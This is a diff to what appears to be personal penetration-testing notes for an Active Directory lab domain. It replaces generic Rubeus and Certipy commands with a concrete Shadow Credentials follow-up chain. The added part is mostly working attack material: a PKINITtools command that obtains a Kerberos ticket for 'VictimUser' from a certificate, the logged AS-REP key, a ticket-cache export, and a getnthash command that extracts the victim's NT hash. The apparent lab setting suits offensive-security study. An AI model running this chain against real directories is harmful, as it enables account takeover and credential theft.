@@ -37,12 +37,39 @@ python3 /home/sako/Tools/pywhisker.py \
   --use-ldaps
 ```
 
-# Rubeus
+# Get TGT
 ```powershell
-.\Rubeus.exe asktgt /user:TargetObject /certificate:MII...base64... /password:"WhiskerPassword" /gettgtpkinit
+python3 /home/sako/Special-Tools/Active-Directory/PKINITtools/gettgtpkinit.py \ 
+  -cert-pfx nPMUcQ1y.pfx \
+  -pfx-pass aVMJutPy4375LBwJ043F \
+  warzone.oxsium.local/VictimUser \
+  /tmp/victimuser.ccache \
+  -dc-ip 192.168.0.199
+```
+```powershell
+2026-04-26 18:13:50,613 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2026-04-26 18:13:50,630 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2026-04-26 18:13:50,649 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2026-04-26 18:13:50,649 minikerberos INFO     997edbc69f9e463467fceb6d1f35f5230da896e9b160e82434ea2945d1b1f280 ( KEY )
+INFO:minikerberos:997edbc69f9e463467fceb6d1f35f5230da896e9b160e82434ea2945d1b1f280
+2026-04-26 18:13:50,652 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
 ```
 
-# Certipy
+# Export to CCACHE
 ```powershell
-certipy auth -pfx target.pfx -dc-ip <DC_IP> -username target_user -domain lab.local
+export KRB5CCNAME=/tmp/victimuser.ccache
+klist
 ```
+
+# Get NT Hash
+```powershell
+python3 /home/sako/Special-Tools/Active-Directory/PKINITtools/getnthash.py \
+  -key 997edbc69f9e463467fceb6d1f35f5230da896e9b160e82434ea2945d1b1f280 \
+  warzone.oxsium.local/VictimUser -dc-ip 192.168.0.199
+```
+
+
